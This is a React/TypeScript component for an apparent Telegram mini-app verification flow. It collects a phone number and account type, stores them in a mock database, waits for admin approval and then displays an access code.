import React, { useState, useEffect } from 'react';
import { useAppConfig } from '../context/AppContext';
import { parsePhoneNumberFromString, CountryCode } from 'libphonenumber-js';
import { MockDatabase, UserTask as UserTaskType } from '../lib/mockDatabase';
import { Loader2, CheckCircle2, Image as ImageIcon } from 'lucide-react';

export default function UserTask() {
  const { telegramId } = useAppConfig();
  const [step, setStep] = useState<'home' | 'form' | 'waiting' | 'success'>('home');
  const [phone, setPhone] = useState('');
  const [country, setCountry] = useState('');
  const [accountType, setAccountType] = useState<'Personal' | 'Business'>('Personal');
  const [taskData, setTaskData] = useState<UserTaskType | null>(null);

  // Listen for storage events to update the UI when Admin performs an action
  useEffect(() => {
    if (!telegramId) return;

    const checkTaskStatus = () => {
      const task = MockDatabase.getTaskByTelegramId(telegramId);
      if (task) {
        setTaskData(task);
        if (task.status === 'success') {
          setStep('success');
        } else if (task.status === 'waiting') {
          setStep('waiting');
        }
      }
    };

    // Initial check
    checkTaskStatus();

    // Polling mechanism since storage events only fire on OTHER tabs
    const interval = setInterval(checkTaskStatus, 1000);
    window.addEventListener('storage', checkTaskStatus);
    
    return () => {
      window.removeEventListener('storage', checkTaskStatus);
      clearInterval(interval);
    };
  }, [telegramId]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setPhone(val);

    try {
      // Use libphonenumber-js to detect country
      const phoneNumber = parsePhoneNumberFromString(val);
      if (phoneNumber?.country) {
        // You would normally use a library to map country codes to names
        // Here we just display the country code
        // libphonenumber provides country calling code, but not country full name natively without external Intl API
        const displayNames = new Intl.DisplayNames(['en'], { type: 'region' });
        const countryName = displayNames.of(phoneNumber.country);
        setCountry(`${countryName} (${phoneNumber.country})`);
      } else {
        setCountry('');
      }
    } catch (err) {
      setCountry('');
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!telegramId || !phone) return;

    // Simulate API Call POST /api/tasks
    const task = MockDatabase.saveTask({
      telegramId,
      phone,
      country,
      accountType
    });
    
    setTaskData(task);
    setStep('waiting');
  };

  if (step === 'home') {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh] p-8 text-center max-w-sm mx-auto">
        <h1 className="text-2xl font-bold mb-4 text-slate-800 tracking-tight">Mini App Auth</h1>
        <p className="text-slate-500 text-sm mb-8">
          Complete the required verification task to receive your access code.
        </p>
        <button
          onClick={() => setStep('form')}
          className="bg-[#24A1DE] text-white font-bold py-3.5 px-8 rounded-xl transition-colors w-full shadow-lg shadow-sky-200"
        >
          Start Verification
        </button>
      </div>
    );
  }

  if (step === 'form') {
    return (
      <div className="flex flex-col max-w-md mx-auto p-6 pt-12">
        <h2 className="text-2xl font-bold mb-6 text-slate-800 tracking-tight">Enter Details</h2>
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="block text-xs uppercase font-bold text-slate-400">Phone Number</label>
            <input
              type="tel"
              value={phone}
              onChange={handlePhoneChange}
              placeholder="+252 63 8364274"
              className="w-full px-4 py-3 bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none text-slate-800 font-medium transition-all shadow-sm"
              required
            />
          </div>

          <div className="bg-slate-50 p-4 rounded-xl space-y-3 text-sm border border-slate-100 shadow-sm">
            <div className="flex justify-between items-center">
              <span className="text-slate-500 text-xs font-bold uppercase tracking-wider">Detection</span>
            </div>
            <div className="flex justify-between items-center text-sm">
              <span className="text-slate-500">Phone</span>
              <span className="font-bold text-slate-800">{phone || '-'}</span>
            </div>
            <div className="flex justify-between items-center text-sm">
              <span className="text-slate-500">Country</span>
              <span className="font-bold text-[#24A1DE]">{country || 'Waiting...'}</span>
            </div>
            <div className="flex justify-between items-center text-sm">
              <span className="text-slate-500">Telegram ID</span>
              <span className="font-mono bg-slate-200 text-slate-600 px-1.5 rounded py-0.5 font-bold tracking-widest">{telegramId}</span>
            </div>
          </div>

          <div className="space-y-3">
            <label className="block text-xs uppercase font-bold text-slate-400">Account Type</label>
            <div className="flex space-x-4 bg-white p-1 rounded-xl border border-slate-200 shadow-sm">
              <label className={`flex-1 flex items-center justify-center space-x-2 cursor-pointer py-2 rounded-lg text-sm font-bold transition-colors ${accountType === 'Personal' ? 'bg-slate-100 text-slate-800 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}>
                <input
                  type="radio"
                  name="accountType"
                  value="Personal"
                  checked={accountType === 'Personal'}
                  className="hidden"
                  onChange={(e) => setAccountType(e.target.value as any)}
                />
                <span>Personal</span>
              </label>
              <label className={`flex-1 flex items-center justify-center space-x-2 cursor-pointer py-2 rounded-lg text-sm font-bold transition-colors ${accountType === 'Business' ? 'bg-slate-100 text-slate-800 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}>
                <input
                  type="radio"
                  name="accountType"
                  value="Business"
                  checked={accountType === 'Business'}
                  className="hidden"
                  onChange={(e) => setAccountType(e.target.value as any)}
                />
                <span>Business</span>
              </label>
            </div>
          </div>

          <button
            type="submit"
            className="w-full bg-[#24A1DE] text-white font-bold py-3.5 px-4 rounded-xl transition-colors shadow-lg shadow-sky-200 mt-2"
          >
            Submit Request
          </button>
        </form>
      </div>
    );
  }

  if (step === 'waiting') {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh] p-8 text-center max-w-sm mx-auto">
        <div className="w-16 h-16 bg-sky-50 rounded-full flex items-center justify-center mb-6">
          <Loader2 className="w-8 h-8 text-[#24A1DE] animate-spin" />
        </div>
        <h2 className="text-xl font-bold text-slate-800 mb-2">Processing...</h2>
        <p className="text-slate-500 text-sm">
          Your request is being reviewed by the admin. Please stay on this screen.
        </p>
      </div>
    );
  }

  if (step === 'success' && taskData) {
    return (
      <div className="flex flex-col items-center px-6 pt-12 max-w-[340px] mx-auto text-center pb-8">
        <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mb-4 mt-4">
          <CheckCircle2 className="w-8 h-8" />
        </div>
        
        <h3 className="text-lg font-bold text-slate-800">Verification Successful</h3>
        <p className="text-xs text-slate-500 mt-2 px-4 mb-6">
          {taskData.successMessage || 'Your account has been verified by the administrator.'}
        </p>

        <div className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl">
          <div className="text-[10px] uppercase font-bold text-slate-400 mb-1">Your Access Code</div>
          <div className="text-2xl font-mono tracking-[0.2em] font-bold text-sky-600">
            {taskData.code || '--------'}
          </div>
        </div>

        {taskData.imageUrl && (
          <div className="mt-4 w-full h-32 bg-slate-200 rounded-xl overflow-hidden relative shadow-inner">
             <div className="absolute inset-0 flex items-center justify-center text-[10px] text-slate-400 uppercase font-bold z-0">Attached Image</div>
             <img 
               src={taskData.imageUrl} 
               alt="Verification Evidence" 
               className="w-full h-full object-cover relative z-10" 
               referrerPolicy="no-referrer"
             />
          </div>
        )}
        
        <button
          onClick={() => {
            setStep('home');
            setPhone('');
            setCountry('');
          }}
          className="mt-6 w-full py-3 bg-[#24A1DE] text-white rounded-xl text-sm font-bold shadow-lg shadow-sky-200"
        >
          Return to Home
        </button>
      </div>
    );
  }

  return null;
}
